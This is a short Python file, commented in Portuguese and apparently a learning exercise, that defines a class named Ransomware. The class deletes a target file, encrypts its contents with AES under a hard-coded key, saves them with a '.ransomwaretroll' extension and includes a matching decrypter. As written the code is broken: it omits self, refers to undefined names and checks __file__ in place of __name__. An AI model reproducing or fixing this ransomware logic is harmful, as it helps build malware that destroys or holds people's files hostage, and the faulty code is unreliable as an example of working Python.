import os
import pyaes

class Ransomware:
    def __init__(path: str):
        ## abrir o arquivo a ser criptografado
        self.file_name = path
        self.file = open(self.file_name, "rb")
        self.file_data = self.file.read()
        self.file.close()

        self.encrypt()

    def encrypt(self):
        ## remover o arquivo
        os.remove(file_name)

        ## chave de criptografia
        key = b"testeransomwares"
        aes = pyaes.AESModeOfOperationCTR(key)

        ## criptografar o arquivo
        crypto_data = aes.encrypt(file_data)

        ## salvar o arquivo criptografado
        new_file = file_name + ".ransomwaretroll"
        new_file = open(f'{new_file}','wb')
        new_file.write(crypto_data)
        new_file.close()

    def decrypter(self):
        ## chave para descriptografia
        key = b"testeransomwares"
        aes = pyaes.AESModeOfOperationCTR(key)
        decrypt_data = aes.decrypt(file_data)

        ## remover o arquivo criptografado
        os.remove(file_name)

        ## criar o arquivo descriptografado
        new_file = "teste.txt"
        new_file = open(f'{new_file}', "wb")
        new_file.write(decrypt_data)
        new_file.close()

if __file__ == '__main__':
    Ransomware("teste.txt")